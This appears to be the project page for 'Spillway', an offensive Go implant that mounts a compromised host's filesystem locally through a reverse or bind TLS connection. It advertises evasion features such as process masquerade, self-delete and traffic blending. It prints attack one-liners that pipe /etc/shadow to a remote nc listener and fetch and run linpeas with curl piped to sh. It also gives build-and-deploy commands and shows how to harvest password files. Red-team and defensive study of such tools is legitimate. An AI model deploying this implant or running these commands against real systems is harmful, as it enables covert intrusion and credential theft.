// capabilities

Remote filesystem, local tools

Deploy a small agent on the target. Mount its entire filesystem locally via FUSE. Browse, read, and write files with standard tools — over TLS 1.3 with mutual PSK authentication.

⇄

Reverse & Bind

Agent calls back to your listener (reverse) or listens for your connection (bind). Both modes over TLS 1.3.

🔒

Mutual PSK Auth

Two-round HMAC-SHA256 challenge-response. Both sides prove key possession. Optional certificate fingerprint pinning.

📁

Full FUSE Mount

Real mountpoint on your machine. Use ls, cat, cp, grep, find, vim — any tool that reads files works transparently.

⚡

Static Binary

CGO_ENABLED=0, zero external deps. Single binary, cross-compiled for linux/windows/darwin, amd64/arm64.

🕵

Opsec Hardened

Process masquerade, core dump prevention, self-delete, stdout/stderr silencing. All config baked at compile time.

🛡

Path Jailing

Symlink-aware path resolution with exclude lists. Agent can't be tricked into escaping the filesystem root.

⏱

Rate Limiting

Token bucket rate limiter controls bandwidth. Blend into normal traffic patterns during operations.

🌐

Proxy Support

HTTP CONNECT proxy tunneling with optional Basic auth. Reach targets through corporate proxies.

// architecture

Four layers. Zero runtime config.

Custom binary wire protocol, TLS 1.3 transport, multiplexed request/response, and FUSE integration. All agent configuration is baked at compile time via ldflags — the binary takes zero arguments.

system architecture
01

Wire Protocol

Custom binary encoding: [4B len][1B type][4B id][payload]. Big-endian, length-prefixed strings. 13 filesystem operations, control messages, 16 MiB frame cap.

02

Transport

TLS 1.3 with optional cert pinning. Mutual HMAC-SHA256 PSK auth. FramedConn with mutex-protected writes. HTTP CONNECT proxy tunneling with bufferedConn wrapper.

03

Agent

Path-jailed filesystem ops with symlink resolution. 64-goroutine worker pool via ServerMux. Token bucket rate limiter. Opsec hardening on all platforms.

04

FUSE + Listener

Listener accepts agent connections, creates sessions with TTL cache. ClientMux multiplexes FUSE calls. bazil.org/fuse presents the remote filesystem as a local mount.

Go 1.22 TLS 1.3 FUSE CGO_ENABLED=0 Zero Runtime Args Cross-Platform

Without Spillway vs. with Spillway

Stop juggling base64-encoded file transfers and fragile shell redirects. Mount the filesystem and use real tools.

WITHOUT SPILLWAY
$ # Find interesting files
$ find / -name "*.conf" 2>/dev/null
$ # Read each one manually
$ cat /etc/app/database.conf
$ # Transfer files one at a time
$ base64 /etc/shadow | nc 10.10.14.5 9001
$ # Upload tools
$ curl http://10.10.14.5/linpeas.sh | sh
$ # Repeat for every file...
WITH SPILLWAY
$ # Mount the entire filesystem
$ ls ./target/
$ # Use any local tool
$ grep -r "password" ./target/etc/
$ cat ./target/etc/shadow
$ find ./target/ -perm -4000
$ cp ./target/var/backups/db.sql .
$ # Everything. Instantly.
// quickstart

Operational in 60 seconds

Clone, build, deploy. Go 1.22+ is the only requirement. The build script handles PSK generation, SNI selection, and cross-compilation automatically.

bash
$ # Clone and build
$ git clone https://github.com/Real-Fruit-Snacks/Spillway.git
$ cd Spillway
$ # Build agent for target
$ ./build.sh reverse 10.10.14.5:443
$ # Build listener
$ make listener
$ # Start listener
$ ./bin/spillway listen --port 443 --mount ./target
$ # Deploy agent on target, then:
$ ls ./target/

The build script auto-generates a PSK, selects a random SNI hostname from a pool of common domains, and cross-compiles a static binary for your target platform.

Use --all to build for all 5 platforms at once. Use --compress to UPX-pack the binary. Use --dry-run to preview the build command without executing.

The listener binary is built separately with make listener — it includes the FUSE mount, CLI, and session management. The agent binary is minimal: stdlib only, zero runtime args.

For bind mode, the agent listens and you connect: ./build.sh bind 0.0.0.0:8443 then ./bin/spillway connect TARGET:8443.

Built for offense. Encrypted by default.
